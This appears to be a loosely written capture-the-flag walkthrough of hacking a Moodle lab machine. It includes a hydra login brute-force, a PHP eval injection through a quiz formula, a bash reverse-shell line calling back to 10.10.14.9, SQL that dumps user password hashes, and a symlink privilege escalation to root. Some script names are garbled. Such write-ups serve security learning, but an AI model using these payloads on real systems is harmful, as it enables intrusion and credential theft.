first we couldnot find anything ..not even any cms

then image directory showed as 5.png which was a text file not a png

we read it said whole the password  except last word

so we used hydra

`hydra -l Giovanni -P char.txt 10.10.10.153 http-post-form "/moodle/login/index.php:username=^USER^&==password=Th4C00lTheacha^PASS^==:Invalid login, please try again"`

but it couldnot find any password as page gave 200 code

so we used ==wfuzz   to bruteforce==

wfuzz ... password===ddfffFUZZ==

it told us the password

then we logged on the ==moodle== but the cms exploit was not easy

in ==quiz== we created a question with ==formula== and injected this as the code was using eval function

``/*{a*/`$_REQUEST[plz]`;//9.9}``

in url we added   `&plz=bash+-i+>%26+/dev/tcp/10.10.14.9/5555+0>%261`

thus we got a shell as www-data

we saw config file which had ==mariadb== password and got passwiord for user

```
MariaDB [(none)]> USE moodle;

MariaDB [(none)]> SHOW TABLES;

MariaDB [(none)]> SELECT username,password FROM mdl_user
```

then

there was a .sh file

```
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```

==`we cant edit it and we tried to`== `put` ==`a shell in courses but no use`==

`==so we used symlink ln -s== /usr/bin/worksdofd.sh`

`and in our current directory a  file named same which link to /usr/bin/worfnkdfnkjdf.sh was created which we can` `edit`

==`so we  injected shell code and aot`== `teh` ==`root shell`==
